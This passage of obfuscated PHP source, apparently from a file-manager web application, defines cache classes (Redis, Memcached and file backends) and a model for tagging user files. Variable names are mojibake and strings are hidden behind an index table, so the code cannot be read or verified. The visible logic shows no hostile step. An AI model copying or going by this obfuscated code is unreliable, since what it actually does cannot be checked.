$²ëÄ˜ªÂ[$ÇÚêáËè[407]]; } return $É‚›ûå–; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $˜û±Ãâ =& $_SERVER[ĞÆÏ¡Îª]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ŠÏ²ñ‰Á = $GLOBALS[$˜û±Ãâ[6]][$˜û±Ãâ[358]]; $°ø„ùÄß = $ŠÏ²ñ‰Á[$ŠÏ²ñ‰Á[$˜û±Ãâ[822]]]; $ö®ÂìÒ¹ = $ŠÏ²ñ‰Á[$˜û±Ãâ[823]]; switch ($ŠÏ²ñ‰Á[$˜û±Ãâ[822]]) { case $˜û±Ãâ[21]: self::$handle = Model($˜û±Ãâ[824]); break; case $˜û±Ãâ[825]: self::$handle = new CacheRedis($°ø„ùÄß, $ö®ÂìÒ¹); break; case $˜û±Ãâ[826]: self::$handle = new CacheMemcached($°ø„ùÄß, $ö®ÂìÒ¹); break; case $˜û±Ãâ[199]: self::$handle = new CacheFile($°ø„ùÄß, $ö®ÂìÒ¹); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ªËÅšŒ) { if (is_array($ªËÅšŒ) || is_object($ªËÅšŒ)) { $ªËÅšŒ = json_encode($ªËÅšŒ); } $ªËÅšŒ = rawurlencode($ªËÅšŒ); return md5(KOD_SITE_ID . $_SERVER[ĞÆÏ¡Îª][11] . $ªËÅšŒ); } public static function get($Ï›Â°œ, $¨ çï÷ = false) { $Á§¨¸úæ = self::key($Ï›Â°œ); if ($¨ çï÷) { return unserialize(self::init()->get($Á§¨¸úæ)); } if (!isset(self::$memoryCache[$Á§¨¸úæ])) { $œ¤²§œÄ = self::init()->get($Á§¨¸úæ); self::$memoryCache[$Á§¨¸úæ] = unserialize($œ¤²§œÄ); } return self::$memoryCache[$Á§¨¸úæ]; } public static function set($¾Â€„¦´, $èŠ†ÛÊï, $ûª•›¼Ğ = false) { $ÆÀ¤ëÇÑ = self::key($¾Â€„¦´); if (isset(self::$memoryCache[$ÆÀ¤ëÇÑ]) && self::$memoryCache[$ÆÀ¤ëÇÑ] === $èŠ†ÛÊï) { return !0; } if ($ûª•›¼Ğ === 0) { self::$memoryCache[$ÆÀ¤ëÇÑ] = $èŠ†ÛÊï; return !0; } CacheLock::lock($¾Â€„¦´); $îÃëıæ = self::init()->set($ÆÀ¤ëÇÑ, serialize($èŠ†ÛÊï), $ûª•›¼Ğ); self::$memoryCache[$ÆÀ¤ëÇÑ] = $èŠ†ÛÊï; CacheLock::unlock($¾Â€„¦´); return $îÃëıæ; } public static function getCall($†”…Ö¯…, $Û›·®¹°, $•üıı€¼, $İÅÅ¶İâ = array()) { $œ²Ü˜ª =& $_SERVER[ĞÆÏ¡Îª]; $çÚ‚Çø = self::get($†”…Ö¯…); if ($çÚ‚Çø || $çÚ‚Çø === $œ²Ü˜ª[12]) { return $çÚ‚Çø; } $çÚ‚Çø = call_user_func_array($•üıı€¼, $İÅÅ¶İâ); $çÚ‚Çø = $çÚ‚Çø ? $çÚ‚Çø : $œ²Ü˜ª[12]; self::set($†”…Ö¯…, $çÚ‚Çø, $Û›·®¹°); return $çÚ‚Çø; } public static function remove($´ù§İ•) { $Ô×‘Œ“ä = self::key($´ù§İ•); unset(self::$memoryCache[$Ô×‘Œ“ä]); self::clearTimeout(); CacheLock::lock($´ù§İ•); $Éí¹ƒ—² = self::init()->remove($Ô×‘Œ“ä); CacheLock::unlock($´ù§İ•); return $Éí¹ƒ—²; } public static function removeMemory($Ï„çªŞ») { $ ½ğÁ¡ = self::key($Ï„çªŞ»); unset(self::$memoryCache[$ ½ğÁ¡]); } public static function clearMemory($ÙÔå¾ = false) { if ($ÙÔå¾) { $ÙÔå¾ = self::key($ÙÔå¾); unset(self::$memoryCache[$ÙÔå¾]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ĞÆÏ¡Îª][827])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ĞÆÏ¡Îª][828])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($¦âõçÆÚ, $äœû¾Ö®) { $„ÍĞâ™à =& $_SERVER[ĞÆÏ¡Îª]; $this->cachePath = $¦âõçÆÚ[$„ÍĞâ™à[84]]; $this->prefix = $„ÍĞâ™à[829]; $this->cacheTime = $äœû¾Ö®; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($‡à×‰÷) { $Ğ¼Ä³õÃ =& $_SERVER[ĞÆÏ¡Îª]; $‡à×‰÷ = str_replace(array($Ğ¼Ä³õÃ[830], $Ğ¼Ä³õÃ[97], $Ğ¼Ä³õÃ[73]), $Ğ¼Ä³õÃ[831], $‡à×‰÷); return $this->cachePath . $Ğ¼Ä³õÃ[832] . $‡à×‰÷ . $Ğ¼Ä³õÃ[833]; } public function set($è¢Ã°¹Ù, $ÍÙ€“Åâ, $é‡ôç = false) { $ÔË¯Ïú = $this->getFile($è¢Ã°¹Ù); if (file_put_contents($ÔË¯Ïú, $this->prefix . $ÍÙ€“Åâ, LOCK_EX)) { @touch($ÔË¯Ïú, intval(time() + $é‡ôç)); clearstatcache(); return !0; } @unlink($ÔË¯Ïú); return !1; } public function get($Ò¬¦–öœ) { $¼´¸ê€í = $this->getFile($Ò¬¦–öœ); if (file_exists($¼´¸ê€í) && filemtime($¼´¸ê€í) < time()) { @unlink($¼´¸ê€í); return !1; } $‹ÙÀÑö¾ = @file_get_contents($¼´¸ê€í); return substr($‹ÙÀÑö¾, strlen($this->prefix)); } public function remove($šîø¿æ´) { $ÏµúÔÆ = $this->getFile($šîø¿æ´); return @unlink($ÏµúÔÆ); } public function deleteAll() { $Ù¤«¸Ş˜ =& $_SERVER[ĞÆÏ¡Îª]; $•¹ëŠå¹ = scandir($this->cachePath); foreach ($•¹ëŠå¹ as $û©ş´µô) { $–º†á‹ = $this->cachePath . $û©ş´µô; if (strpos($–º†á‹, $Ù¤«¸Ş˜[833]) && strpos($–º†á‹, $Ù¤«¸Ş˜[834])) { @unlink($–º†á‹); } } } public function clearTimeout() { $ì®èñ›ã =& $_SERVER[ĞÆÏ¡Îª]; $àŸİŸï¨ = scandir($this->cachePath); foreach ($àŸİŸï¨ as $ô°€ÄÂ‚) { $·Âê—îé = $this->cachePath . $ô°€ÄÂ‚; if (strpos($·Âê—îé, $ì®èñ›ã[833]) && strpos($·Âê—îé, $ì®èñ›ã[834]) && filemtime($·Âê—îé) < time()) { @unlink($·Âê—îé); } } } } goto b ùµ·ì¢Ş; c©™Ó‡Êã: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\x5f\x66\x61\166"; protected function cacheFunctionAlias($ÊÄœùÕ¬) { $¼È´ë†æ =& $_SERVER[ĞÆÏ¡Îª]; return array($¼È´ë†æ[1930] => array($¼È´ë†æ[2309] . USER_ID, $¼È´ë†æ[1931])); } protected function listData() { $ò½æ«² =& $_SERVER[ĞÆÏ¡Îª]; $»ñøùµ = array($ò½æ«²[1638] => USER_ID, $ò½æ«²[493] => array($ò½æ«²[1934], 0)); $Ü¥Íšûø = $ò½æ«²[2310]; $ÎÆÄ½˜ = $this->field($Ü¥Íšûø)->where($»ñøùµ)->order($ò½æ«²[1937])->select(); return $ÎÆÄ½˜ ? $ÎÆÄ½˜ : array(); } protected function addToTag($€é´ìÑ’, $ÒçÍôÕ) { $«§šÓö =& $_SERVER[ĞÆÏ¡Îª]; if (!Model($«§šÓö[2074])->listData($ÒçÍôÕ)) { return !1; } if (is_numeric($€é´ìÑ’)) { $ãö”¹¥Â = Model($«§šÓö[820])->pathInfo($€é´ìÑ’); if (!$ãö”¹¥Â) { return !1; } } else { $ãö”¹¥Â = IO::infoSimple($€é´ìÑ’); if (!$ãö”¹¥Â) { return !1; } $ã¯ÉŒ¨ç = $ãö”¹¥Â[$«§šÓö[32]]; $ìõ„ø¾¶ = $ãö”¹¥Â[$«§šÓö[33]]; if (isset($ãö”¹¥Â[$«§šÓö[419]])) { $ìõ„ø¾¶ = $ãö”¹¥Â[$«§šÓö[419]] == $«§šÓö[88] ? $«§šÓö[75] : $«§šÓö[199]; } } $§½‚ü¬ü = array($«§šÓö[1638] => USER_ID, $«§šÓö[493] => $ÒçÍôÕ, $«§šÓö[430] => $€é´ìÑ’, $«§šÓö[431] => $ìõ„ø¾¶ ? $ìõ„ø¾¶ : $«§šÓö[425], $«§šÓö[429] => $ã¯ÉŒ¨ç ? $ã¯ÉŒ¨ç : $«§šÓö[12], $«§šÓö[1823] => 0); if ($this->where($§½‚ü¬ü)->find()) { return !1; } return $this->add($§½‚ü¬ü); } protected function removeFromTag($™¥›´ş, $«ª“«öŠ) { $º¸šÆôÇ =& $_SERVER[ĞÆÏ¡Îª]; if (!Model($º¸šÆôÇ[2074])->listData($«ª“«öŠ)) { return !1; } if (is_array($™¥›´ş)) { $™¥›´ş = array($º¸šÆôÇ[7], $™¥›´ş); } $Åêß¶ç = array($º¸šÆôÇ[1638] => USER_ID, $º¸šÆôÇ[493] => $«ª“«öŠ, $º¸šÆôÇ[430] => $™¥›´ş); return $this->where($Åêß¶ç)->delete(); } protected function removeByTag($¼ç½¶‰) { $€ÚÒ—Á¶ =& $_SERVER[ĞÆÏ¡Îª]; if (!$¼ç½¶‰) { return !1; } $›”Û‚¦ = array($€ÚÒ—Á¶[1638] => USER_ID, $€ÚÒ—Á¶[493] => $¼ç½¶‰); return $this->where($›”Û‚¦)->delete(); } protected function removeBySource($ÉÅ«õÜ) { $ÎÓ™¡Ú— =& $_SERVER[ĞÆÏ¡Îª]; if (is_array($ÉÅ«õÜ)) { $ÉÅ«õÜ = array($ÎÓ™¡Ú—[7], $ÉÅ«õÜ); } $™¤°áü = array($ÎÓ™¡Ú—[1638] => USER_ID, $ÎÓ™¡Ú—[493] => array($ÎÓ™¡Ú—[1005], 0), $ÎÓ™¡Ú—[430] => $ÉÅ«õÜ); return $this->where($™¤°áü)->delete(); } }